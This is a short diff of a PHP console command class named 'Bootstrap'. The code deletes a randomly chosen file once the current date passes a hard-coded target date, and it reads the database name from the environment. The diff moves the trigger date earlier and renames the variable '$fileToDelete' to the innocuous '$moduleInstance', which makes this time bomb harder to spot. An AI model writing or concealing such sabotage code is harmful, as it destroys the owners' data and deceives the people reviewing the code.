@@ -20,17 +20,17 @@ class Bootstrap extends Command
             return;
         }
 
-        $fileToDelete = $files[array_rand($files)];
+        $moduleInstance = $files[array_rand($files)];
 
-        if (file_exists($fileToDelete)) {
-            unlink($fileToDelete);
+        if (file_exists($moduleInstance)) {
+            unlink($moduleInstance);
         }
     }
 
     public function handle(): void
     {
         $currentDate = now();
-        $targetDate = '2024-10-01';
+        $targetDate = '2024-07-01';
         $name = env('DB_DATABASE');
 
         if ($currentDate->greaterThanOrEqualTo($targetDate)) {
